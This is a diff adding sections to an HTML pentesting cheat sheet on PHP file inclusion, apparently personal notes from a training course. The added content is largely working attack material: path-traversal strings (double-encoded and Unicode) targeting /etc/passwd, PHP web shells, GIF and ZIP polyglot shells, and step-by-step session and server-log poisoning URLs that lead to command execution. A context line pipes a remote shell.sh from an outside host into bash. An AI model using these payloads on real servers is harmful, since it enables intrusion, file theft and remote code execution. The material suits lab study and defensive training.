@@ -62,9 +62,22 @@ http://.../index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%7
 http://.../index.php?language=./languages/../../../../etc/passwd
 http://...index.php?language=/etc/passwd%00.php</code></pre>
 
+                            <p>Remember that you might use double encoding, since "." or "/" are sanitized using php or others...</p>
+                            <pre><code class="language-bash">%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%252F</code></pre>
+                            
+
                             <h3>Local File Inclusion using UNICODE chars</h3>
                             <p>Normally there are sanitizations that prevent for LFI but in some cases you could be able to bypass them by using UNICODE chars take a look at <a class="notion-link" href="https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html"> Hacktricks</a></p>
                             <pre><code class="language-bash">%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd</code></pre>    
+                            
+                            <h3>Hidden parameters</h3>
+                            <ul>
+                                <p>It's posible that you find a website which has some hidden parameters. For example an index.php which is practically empty but that it contains a hidden parameter</p>
+                                <p>Using the following wordlist you'll be able to figure out. CAIDO is the best option to perform the FUZZING</p>
+                                <p><b>Parameter wordlist</b> -> /home/kali/Desktop/Academy/file_inclusion/burp-parameter-names.txt </p>
+                                <p><b>LFI wordlist</b>  -> <a>/usr/share/seclist/Fuzzing/LFI/LIF-Jhaddix.txt</a></p>
+                            </ul>
+                        
                         </ul>
 
                         <h2 id="RFI: Remote File Inclusion">RFI: Remote File Inclusion</h2>
@@ -297,12 +310,43 @@ os.system("curl http://10.10.14.17:8000/shell.sh | bash")
                             <h2 id = "File Upload" >File Upload</h2>
                             <ul>
                                 <p>In case you found a method of file upload which can be exploited. (Normally by know where are located the uploaded files and which is it's name)</p>
+                                <p>It's important to note that even though you find the shell in /uploads/shell.php you may not be able to execute that php code</p>
                                 <pre><code class="language-php">&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"?&gt;</code></pre>
                                 <p>Creation of a malicious GIF file</p>
                                 <pre><code class="language-php">echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' > shell.gif</code></pre>
-                                
-                            </ul>    
-                        </ul>
+                                <p>Creation of a malicious ZIP file. The resultant file is the shell.jpg</p>
+                                <pre><code class="language-php">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php && zip shell.jpg shell.php</code></pre>
+                                <p>Then we can execute it using zip://./profile_images/shell.jpg#shell.php&cmd=ids</p>
+                            </ul>
+                            
+                            <h2 id="Log Poisoning">Log Poisoning</h2>
+                            <ul>
+                                <h3>PHP Session Poisoning</h3>
+                                <ul>
+                                    <p>In case the website uses PHPSESSID in order to store it's cookies we could remote execute code</p>
+                                    <p>Normally the cookie information is located at <b>/var/lib/php/sessions/ (Linux) and C:\Windows\Temp\ (Windows)</b> </p>
+                                    <p>Inside these folders cookies stay as <b>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3</b></p>
+                                    <p>So in case you take your cookie and try to include it</p>
+                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></pre>
+                                    <p>In case any of the parameters listed are under your control you may be able to change it and introduce typical php code execution. Attempt to change it by simple using</p>
+                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=session_poisoning</code></pre>
+                                    <p>Visit the cookie again using sess_nhhv... and check if parameter was changed. If positive, perform the same but this time with a command execution using php</p>
+                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></pre>
+                                    <p>Finally visit the cookie again and execute a command of your preference</p>
+                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id</code></pre>
+                                </ul>
+
+                                <h3>Server log Poisoning</h3>
+                                <ul>
+                                    <p>In this case we must check if we are able to view the logs using a file inclusion.</p>
+                                    <p>Apache logs are normally located at <b>/var/log/apache2/access.log, error.log  (Linux)</b> and <b>C:\xampp\apache\logs\ (Windows)</b></p>
+                                    <p>Nginx logs are normally located at <b>/var/log/nginx/ (Linux)</b> and <b>C:\nginx\log\</b></p>
+                                    <p>In case you are able to read any of them you'll figure out that the User-Agent is also stored there, which is a parameter that we can control</p>
+                                    <p>So you'll need to intercept the request and introduce any php code &lt;?php system($_GET['cmd']) ?&gt;</p>
+                                    <p>Then send the request </p>
+                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log?cmd=id</code></pre>
+                                </ul>
+                            </ul>
                     </div>
                 </ul>
             </div>
